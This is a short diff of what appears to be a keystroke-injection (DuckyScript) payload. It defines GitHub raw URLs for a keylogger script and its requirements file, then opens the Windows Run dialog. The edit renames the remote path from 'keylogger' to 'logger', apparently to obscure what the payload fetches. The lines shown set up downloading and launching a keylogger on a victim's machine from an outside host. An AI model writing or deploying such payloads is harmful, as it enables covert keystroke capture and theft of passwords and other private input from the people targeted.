@@ -1,5 +1,5 @@
-DEFINE #SCRIPTURL1 https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/keylogger/script.py
-DEFINE #SCRIPTURL2 https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/keylogger/requirements.txt
+DEFINE #SCRIPTURL1 https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/logger/script.py
+DEFINE #SCRIPTURL2 https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/logger/requirements.txt
 
 GUI r
 DELAY 500
